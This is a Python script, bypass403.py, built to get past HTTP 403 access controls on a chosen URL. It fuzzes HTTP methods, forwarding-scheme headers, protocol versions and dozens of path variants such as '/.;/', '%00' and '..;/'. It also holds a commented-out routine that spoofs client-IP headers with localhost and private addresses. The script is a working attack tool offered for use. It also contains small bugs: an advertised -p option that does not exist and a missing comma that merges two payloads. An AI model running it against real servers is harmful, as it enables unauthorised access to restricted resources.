import requests
import getopt
import sys


from http.client import HTTPConnection
from urllib.parse import urlparse

USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}


def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-r , --redirect\tfollow redirection")
    print("EXAMPLES: ")    
    print("\tbypass403.py -u http://example.com -p test")
    print("\tbypass403.py --url=http://example.com --path=test")

    
def good_code(code, text):
    good = "[+]"
    if code >= 400 and code <= 526:
        good = "[-]"
    return good + text


def version_fuzz(url, path, redirect):
    version_payloads = ["HTTP/0.9",
                        "HTTP/1.0",
                        "HTTP/1.1",
                        "HTTP/2"]
    for version in version_payloads:
        HTTPConnection._http_vsn_str = version
        resp = requests.get(f"{url}/{path}", headers=USER_AGENT, allow_redirects=redirect)
        print(good_code(resp.status_code,f" {version} [code:{resp.status_code} size:{len(resp.content)}]"))
    HTTPConnection._http_vsn_str = "HTTP/1.1"

        
def methods_fuzz(url, path, redirect):
    method_payloads = ["GET",
                       "PUT",                       
                       "POST",
                       "HEAD",                       
                       "COPY",
                       "MOVE",
                       "LOCK",
                       "MKCOL",
                       "PATCH",
                       "TRACE",
                       "UNLOCK",
                       "DELETE",
                       "SEARCH",
                       "OPTIONS",
                       "CONNECT"]
    
    for method in method_payloads:
        resp = requests.request(method, f"{url}/{path}", headers=USER_AGENT, allow_redirects=redirect)
        print(good_code(resp.status_code, f" {method} {url}/{path} [code:{resp.status_code} size:{len(resp.content)}]"))


    
def scheme_fuzz(url, path, redirect):
    protocol_payloads = ["X-Forwarded-Protocol",
                         "X-Forwarded-Proto",
                         "X-Url-Scheme",
                         "X-Forwarded-Scheme"]
    
    scheme_payloads = ["http",
                       "https"]
    
    for scheme in scheme_payloads:
        for proto in protocol_payloads:
            resp = requests.get(f"{url}/{path}", headers={proto : scheme, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
            print(good_code(resp.status_code,f" {proto}: {scheme} [code:{resp.status_code} size:{len(resp.content)}]"))

    
def headers_fuzz(url, path, redirect):
    headers_payloads = ["Client-IP",
                        "True-Client-IP",
                        "Cluster-Client-IP",
                        "Forwarded-For",
                        "Source-IP",
                        "WL-Proxy-Client-IP",
                        "Host",
                        "X-Forwarded-For",
                        "X-Forwarded",
                        "X-Forwared-Host",
                        "X-Forward-For",
                        "X-Forwarded-By",
                        "X-Forwarded-For-Original",
                        "X-Forwarded-Server",
                        "X-Remote-IP",
                        "X-Remote-Addr",
                        "X-Original-URL",
                        "X-Rewrite-URL",
                        "X-Originating-IP",
                        "X-Original-Host",
                        "X-Original-IP",
                        "X-Original-Remote-Addr",
                        "X-Originally-Forwarded-For",
                        "X-ProxyUser-Ip",
                        "X-Gateway-Host",
                        "X-Host",
                        "X-Ip",
                        "X-Backend-Host",
                        "X-ProxyMesh-IP",
                        "X-Real-IP",
                        "X-True-Client-IP",
                        "X-Wap-Profile"]
    
    values_payloads = ["0",
                       "127.0.0.1",
                       "10.0.0.0",
                       "10.0.0.1",
                       "172.16.0.0",
                       "172.16.0.1",
                       "192.168.1.0",
                       "192.168.1.1",
                       "2130706433",
                       "0x7F000001",
                       "0177.0000.0000.0001",
                       "127.0.0.1:80",
                       "127.0.0.1:8080",
                       "127.0.0.1:8000",
                       "127.0.0.1:4443",
                       "127.0.0.1:443",
                       "localhost",
                       "localhost:80",
                       "localhost:8080",
                       "localhost:8000",                       
                       "localhost:443",
                       "localhost:4443"]

       
    for header in headers_payloads:
        for value in values_payloads:
            resp = requests.get(f"{url}/{path}", headers={header : value, "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
            print(good_code(resp.status_code,f" {header}: {value} [code:{resp.status_code} size:{len(resp.content)}]"))
            
    resp = requests.get(f"{url}", headers={"X-Original-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
    print(good_code(resp.status_code,f" X-Original-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))
    
    resp = requests.get(f"{url}", headers={"X-Rewrite-URL" : f"/{path}", "User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}, allow_redirects=redirect)
    print(good_code(resp.status_code,f" X-Rewrite-URL: /{path} [code:{resp.status_code} size:{len(resp.content)}]"))

            
def paths_fuzz(url, path, redirect):
    paths_payloads = [f"{url}/{path}",                      
                      f"{url}/{path.upper()}",
                      f"{url}/.{path}",
                      f"{url}/~{path}",
                      f"{url}/;/{path}",
                      f"{url}/.;/{path}",
                      f"{url}//;//{path}",
                      f"{url}/.;/{path}.",
                      f"{url}/{path}.",
                      f"{url}/{path}/",                                            
                      f"{url}/{path}/.",
                      f"{url}/{path}/./",
                      f"{url}/*{path}/",
                      f"{url}/{path}/*",
                      f"{url}/{path}#",
                      f"{url}/{path}~",
                      f"{url}/{path}?",
                      f"{url}/{path}??",
                      f"{url}/{path}???",
                      f"{url}//{path}//",
                      f"{url}//{path}/./",
                      f"{url}///{path}///",
                      f"{url}/.;/{path}/.",
                      f"{url}/.;/{path}/./",
                      f"{url}/.;/{path}/*",
                      f"{url}/.;/{path}/.."
                      f"{url}/./{path}/",
                      f"{url}/./{path}/..",
                      f"{url}/./{path}/./",                      
                      f"{url}/{path}..;/",
                      f"{url}/{path}/..;/",                      
                      f"{url}/{path}%20",
                      f"{url}/{path}%09",
                      f"{url}/{path}%00",
                      f"{url}/{path}.json"]
    
    for p in paths_payloads:
        resp = requests.get(p, headers=USER_AGENT, allow_redirects=redirect)        
        print(good_code(resp.status_code, f" {p} [code:{resp.status_code} size:{len(resp.content)}]"))


def parse_url(url):
    u = ""
    p = ""
    data = urlparse(url)
    u = f"{data.scheme}://{data.netloc}"
    if data.path[0] == '/':
        p = data.path[1:]
    return u, p    

    
def main():       
    url = None
    redirect = False
    try:
        try:
            opts, args = getopt.getopt(sys.argv[1:], "u:r", ["url=", "redirect"])
            for opt, arg in opts:            
                if opt in ("-u", "--url"):                    
                    url = arg
                elif opt in ("-r", "--redirect"):
                    redirect = True
                else:
                    help()
                    sys.exit(0)
        except getopt.GetoptError as err:
            help()
            sys.exit(0)
            
        if url is not None:            
            print(f"\nTARGET: {url}\n")            
            url, path = parse_url(url)
            
            print("-------------------")
            print("[!] Methods fuzzing")
            print("-------------------\n")
            methods_fuzz(url, path, redirect)

            print("\n-------------------")
            print("[!] Scheme fuzzing")
            print("-------------------\n")
            scheme_fuzz(url, path, redirect)

            print("\n-------------------")
            print("[!] Version fuzzing")
            print("-------------------\n")
            version_fuzz(url, path, redirect)
            
            print("\n-----------------")
            print("[!] Paths fuzzing")
            print("-----------------\n")
            paths_fuzz(url, path, redirect)
            
            """print("\n-------------------")
            print("[!] Headers fuzzing")
            print("-------------------\n")
            headers_fuzz(url, path, redirect)"""
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    

if __name__ == "__main__":
    main()
